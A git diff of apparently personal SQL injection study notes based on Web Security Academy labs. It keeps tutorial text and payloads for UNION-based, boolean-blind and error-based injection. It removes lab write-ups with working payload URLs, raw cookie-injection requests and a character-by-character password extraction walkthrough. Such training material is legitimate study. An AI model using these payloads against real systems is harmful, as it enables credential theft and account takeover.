@@ -112,15 +112,10 @@ We use NULL as the values returned from the injected SELECT query because the da
 
 As with the ORDER BY technique, the application might actually return the database error in its HTTP response, but may return a generic error or simply return no results. When the number of nulls matches the number of columns, the database returns an additional row in the result set, containing null values in each column. The effect on the HTTP response depends on the application's code. If you are lucky, you will see some additional content within the response, such as an extra row on an HTML table. Otherwise, the null values might trigger a different error, such as a NullPointerException. In the worst case, the response might look the same as a response caused by an incorrect number of nulls. This would make this method ineffective.
 
-### Challenge
-In Shop, determine the number of columns in the query by using the UNION injection technique. 
-Vulnerabilities was in the categories filter for the shop. By adding the payload ```' UNION NULL,NULL,NULL --``` I was able to find that there are three columns. 
-https://0ada00d6045bf2a780398acb006300ca.web-security-academy.net/filter?category=Gifts%27%20UNION%20SELECT%20NULL,NULL,NULL%20--
-
 # Database-specific syntax
 On Oracle, every SELECT query must use the FROM keyword and specify a valid table. There is a built-in table on Oracle called dual which can be used for this purpose. So the injected queries on Oracle would need to look like:
 
-' UNION SELECT NULL FROM DUAL--
+```' UNION SELECT NULL FROM DUAL--```
 The payloads described use the double-dash comment sequence -- to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character # can be used to identify a comment.
 
 For more details of database-specific syntax, see the SQL injection cheat sheet.
@@ -129,22 +124,16 @@ For more details of database-specific syntax, see the SQL injection cheat sheet.
 A SQL injection UNION attack enables you to retrieve the results from an injected query. The interesting data that you want to retrieve is normally in string form. This means you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.
 
 After you determine the number of required columns, you can probe each column to test whether it can hold string data. You can submit a series of UNION SELECT payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:
-
+```
 ' UNION SELECT 'a',NULL,NULL,NULL--
 ' UNION SELECT NULL,'a',NULL,NULL--
 ' UNION SELECT NULL,NULL,'a',NULL--
 ' UNION SELECT NULL,NULL,NULL,'a'--
+```
 If the column data type is not compatible with string data, the injected query will cause a database error, such as:
 
 Conversion failed when converting the varchar value 'a' to data type int.
 If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.
-
-### Challenge
-Using Union injection techniques, find the column containing text (strings). 
-First, I find the number of coulmns in Shop's category filter again with the UNION NULL technique - https://0a3900db04b810b680bd6c3f0068007f.web-security-academy.net/filter?category=Tech+gifts%27%20UNION%20SELECT%20NULL,NULL,NULL%20--
-Then, we start replacing each of the nulls iteratively with the letter a, or any character, until we find the column that doesn't error out. Multiple columns might work. The character needs to be encased in single quotes. 
-It was the second column in this case - https://0a3900db04b810b680bd6c3f0068007f.web-security-academy.net/filter?category=Tech+gifts%27%20UNION%20SELECT%20NULL,%27a%27,NULL%20--
-Once found, I had to made the database retrieve a specific string 'SIHTLj' to solve the challenge. 
 
 # Using a SQL injection UNION attack to retrieve interesting data
 When you have determined the number of columns returned by the original query and found which columns can hold string data, you are in a position to retrieve interesting data.
@@ -159,17 +148,13 @@ In this example, you can retrieve the contents of the users table by submitting 
 ' UNION SELECT username, password FROM users--
 In order to perform this attack, you need to know that there is a table called users with two columns called username and password. Without this information, you would have to guess the names of the tables and columns. All modern databases provide ways to examine the database structure, and determine what tables and columns they contain.
 
-## Challenge
-Retrieve username and password for administrator and log in as him in Shop.
-https://0aff00d004cba3b98170bba400b60010.web-security-academy.net/filter?category=Gifts%27%20UNION%20SELECT%20username,%20password%20FROM%20users--
-
-
 # Retrieving multiple values within a single column
 In some cases the query in the previous example may only return a single column.
 
 You can retrieve multiple values together within this single column by concatenating the values together. You can include a separator to let you distinguish the combined values. For example, on Oracle you could submit the input:
-
+```
 ' UNION SELECT username || '~' || password FROM users--
+```
 This uses the double-pipe sequence || which is a string concatenation operator on Oracle. The injected query concatenates together the values of the username and password fields, separated by the ~ character.
 
 The results from the query contain all the usernames and passwords, for example:
@@ -179,14 +164,6 @@ administrator~s3cure
 wiener~peter
 carlos~montoya
 ...
-
-## Challenge
-Find the username and password using concatination from the categories vulnerable to SQLi in Shop. 
-First find the column number and which one holds the strings:
-Columns - https://0aed0012040b1d87810be30d008f00b2.web-security-academy.net/filter?category=Gifts%27%20UNION%20SELECT%20NULL,NULL--
-Strings - https://0aed0012040b1d87810be30d008f00b2.web-security-academy.net/filter?category=Gifts%27%20UNION%20SELECT%20NULL,%27abc%27--
-Now concatenate the username and password fields from the users table - https://0aed0012040b1d87810be30d008f00b2.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+NULL,username||%27~%27||password+FROM+users--
-Where the concatination was ``` 'UNION SELECT NULL,username||'~'||password FROM users--```
 
 # Examining the database in SQL injection attacks
 To exploit SQL injection vulnerabilities, it's often necessary to find information about the database. This includes:
@@ -213,13 +190,6 @@ Mar 18 2018 09:11:49
 Copyright (c) Microsoft Corporation
 Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
 ```
-
-## Challenge
-
-In Shop, retrieve the version string from a Microsoft or MySQL database via the categories SQLi. 
-https://0a16000704c7fa748121757300f70013.web-security-academy.net/filter?category=Tech+gifts%27%20UNION%20ALL%20SELECT%20NULL,version()%20--%20-
-
-The solution payload didn't actually work in this case, I ended up using SQLmap to find payloads that did work and then made the above one on my own. 
 
 # Listing the contents of the database
 Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.
@@ -248,14 +218,6 @@ MyDatabase     dbo           Users       Username     varchar
 MyDatabase     dbo           Users       Password     varchar
 This output shows the columns in the specified table and the data type of each column.
 
-## Challenge
-Get the database and table information out of the database in Shop via the Category param vulnerability to get the username and password for administrator then login. 
-
-First, determine number of columns. 
-Second, list table names from information_schema.tables - https://0a4f00e4033d3a1fde03c8b600d0007e.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
-Third, select the column names from the table from information_schema.columns - https://0a4f00e4033d3a1fde03c8b600d0007e.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns%20WHERE%20table_name=%27users_brauzl%27--
-Finally, extract the usernames and passwords from the table users_brauzl and the columns found - https://0a4f00e4033d3a1fde03c8b600d0007e.web-security-academy.net/filter?category=Gifts%27%20UNION%20SELECT%20username_onopjk,%20password_bikvfm%20FROM%20users_brauzl%20--
-
 # Blind SQL injection
 In this section, we describe techniques for finding and exploiting blind SQL injection vulnerabilities.
 
@@ -266,11 +228,13 @@ Many techniques such as UNION attacks are not effective with blind SQL injection
 
 ## Exploiting blind SQL injection by triggering conditional responses
 Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:
-
+```
 Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
+```
 When a request containing a TrackingId cookie is processed, the application uses a SQL query to determine whether this is a known user:
-
+```
 SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
+```
 This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data. If you submit a recognized TrackingId, the query returns data and you receive a "Welcome back" message in the response.
 
 This behavior is enough to be able to exploit the blind SQL injection vulnerability. You can retrieve information by triggering different responses conditionally, depending on an injected condition.
@@ -304,41 +268,6 @@ We can continue this process to systematically determine the full password for t
 Note
 The SUBSTRING function is called SUBSTR on some types of database. For more details, see the SQL injection cheat sheet.
 
-### Challenge
-In Shop, find the SQL injection (trackingId cookie) and then use blind boolean methods to uncover the administrator's password to login. 
-
-Found the SQLi by conducting a simple 1=1 boolean injection on the cookie which when 1=2 we did not get the "Welcome Back" tracking banner but when 1=1 we did. 
-```
-GET /filter?category=Toys+%26+Games HTTP/2
-Host: 0af200090370843486cfde7a00470058.web-security-academy.net
-Cookie: TrackingId=BQ4yupPEXi6QwoRX'+AND+'1'='2'--; session=v6Cy546NwHBVlsM3LlV8KsK1hkx78Dwm
-```
-Then, we check to see if there is a username that starts with 'a' in the users table:
-```
-GET /filter?category=Toys+%26+Games HTTP/2
-Host: 0af200090370843486cfde7a00470058.web-security-academy.net
-Cookie: TrackingId=BQ4yupPEXi6QwoRX'+AND+(SELECT 'a' FROM users LIMIT 1)='a; session=v6Cy546NwHBVlsM3LlV8KsK1hkx78Dwm
-```
-Then, validate that the username is indeed administrator:
-```
-GET /filter?category=Toys+%26+Games HTTP/2
-Host: 0af200090370843486cfde7a00470058.web-security-academy.net
-Cookie: TrackingId=BQ4yupPEXi6QwoRX'+AND+(SELECT 'a' FROM users WHERE username='administrator')='a; session=v6Cy546NwHBVlsM3LlV8KsK1hkx78Dwm
-```
-Determine the length of the administrators password by asking if it is true that the length is greater than 19 which it is but it is not greater than 20:
-```
-GET /filter?category=Toys+%26+Games HTTP/2
-Host: 0af200090370843486cfde7a00470058.web-security-academy.net
-Cookie: TrackingId=BQ4yupPEXi6QwoRX'+AND+(SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>19)='a; session=v6Cy546NwHBVlsM3LlV8KsK1hkx78Dwm
-```
-Next, we're looking to find all 20 characters to the password. 
-```
-GET /filter?category=Toys+%26+Games HTTP/2
-Host: 0af200090370843486cfde7a00470058.web-security-academy.net
-Cookie: TrackingId=BQ4yupPEXi6QwoRX'+AND+(SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a; session=v6Cy546NwHBVlsM3LlV8KsK1hkx78Dwm
-```
-The above request gets sent to intruder where we section  mark the last 'a' and iterate through it along with each position until we find the complete password. Each 'true' letter is confirmed by the "Welcome Back" message being displayed which we can filter for in intruder. 
-
 # Error-based SQL injection
 Error-based SQL injection refers to cases where you're able to use error messages to either extract or infer sensitive data from the database, even in blind contexts. The possibilities depend on the configuration of the database and the types of errors you're able to trigger:
 
@@ -365,91 +294,6 @@ Using this technique, you can retrieve data by testing one character at a time:
 ```
 xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
 ```
-
-### Challenge
-In Shop, this one is using an Oracle DB, find the username and password for the administrator and login. 
-Found the injection is in the trackingID cookie again but this time there is no Welcome Back banner. Instead, it throws and error when I append a single quote. Appending double single quotes fixes the query so that's the injection point. 
-Next, we need to try to find a predictable database name for Oracle and see if we can get info from it, for this I used ```'||(SELECT '' FROM dual)||'```
-```
-GET /filter?category=Gifts HTTP/2
-Host: 0a26004603ad956483044797002a0054.web-security-academy.net
-Cookie: TrackingId=b2qz4FN3jzJ5SshUv'||(SELECT '' FROM dual)||'; session=mhReDB1XnUY34J9i3trzjI3C9SDSW1eF
-```
-This returned a valid response which was then verified by changing dual to 'foo' which threw another error. So we can infer true statements by whether or not the server throws an error. 
-
-Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie. For simplicity, let's say the original value of the cookie is TrackingId=xyz.
-Modify the TrackingId cookie, appending a single quotation mark to it:
-
-TrackingId=xyz'
-Verify that an error message is received.
-
-Now change it to two quotation marks:
-TrackingId=xyz''
-Verify that the error disappears. This suggests that a syntax error (in this case, the unclosed quotation mark) is having a detectable effect on the response.
-You now need to confirm that the server is interpreting the injection as a SQL query i.e. that the error is a SQL syntax error as opposed to any other kind of error. To do this, you first need to construct a subquery using valid SQL syntax. Try submitting:
-
-TrackingId=xyz'||(SELECT '')||'
-In this case, notice that the query still appears to be invalid. This may be due to the database type - try specifying a predictable table name in the query:
-
-TrackingId=xyz'||(SELECT '' FROM dual)||'
-As you no longer receive an error, this indicates that the target is probably using an Oracle database, which requires all SELECT statements to explicitly specify a table name.
-
-Now that you've crafted what appears to be a valid query, try submitting an invalid query while still preserving valid SQL syntax. For example, try querying a non-existent table name:
-
-TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'
-This time, an error is returned. This behavior strongly suggests that your injection is being processed as a SQL query by the back-end.
-
-As long as you make sure to always inject syntactically valid SQL queries, you can use this error response to infer key information about the database. For example, in order to verify that the users table exists, send the following query:
-
-TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
-As this query does not return an error, you can infer that this table does exist. Note that the WHERE ROWNUM = 1 condition is important here to prevent the query from returning more than one row, which would break our concatenation.
-
-You can also exploit this behavior to test conditions. First, submit the following query:
-
-TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
-Verify that an error message is received.
-
-Now change it to:
-
-TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
-Verify that the error disappears. This demonstrates that you can trigger an error conditionally on the truth of a specific condition. The CASE statement tests a condition and evaluates to one expression if the condition is true, and another expression if the condition is false. The former expression contains a divide-by-zero, which causes an error. In this case, the two payloads test the conditions 1=1 and 1=2, and an error is received when the condition is true.
-
-You can use this behavior to test whether specific entries exist in a table. For example, use the following query to check whether the username administrator exists:
-
-TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
-Verify that the condition is true (the error is received), confirming that there is a user called administrator.
-
-The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to:
-
-TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
-This condition should be true, confirming that the password is greater than 1 character in length.
-
-Send a series of follow-up values to test different password lengths. Send:
-
-TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
-Then send:
-
-TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
-And so on. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the error disappears), you have determined the length of the password, which is in fact 20 characters long.
-
-After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.
-Go to Burp Intruder and change the value of the cookie to:
-
-TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
-This uses the SUBSTR() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
-
-Place payload position markers around the final a character in the cookie value. To do this, select just the a, and click the "Add §" button. You should then see the following as the cookie value (note the payload position markers):
-
-TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
-To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. In the "Payloads" side panel, check that "Simple list" is selected, and under "Payload configuration" add the payloads in the range a - z and 0 - 9. You can select these easily using the "Add from list" drop-down.
-Launch the attack by clicking the " Start attack" button.
-Review the attack results to find the value of the character at the first position. The application returns an HTTP 500 status code when the error occurs, and an HTTP 200 status code normally. The "Status" column in the Intruder results shows the HTTP status code, so you can easily find the row with 500 in this column. The payload showing for that row is the value of the character at the first position.
-Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the original Intruder tab, and change the specified offset from 1 to 2. You should then see the following as the cookie value:
-
-TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
-Launch the modified attack, review the results, and note the character at the second offset.
-Continue this process testing offset 3, 4, and so on, until you have the whole password.
-In the browser, click "My account" to open the login page. Use the password to log in as the administrator user.
 
 # Extracting sensitive data via verbose SQL error messages
 Misconfiguration of the database sometimes results in verbose error messages. These can provide information that may be useful to an attacker. For example, consider the following error message, which occurs after injecting a single quote into an id parameter:
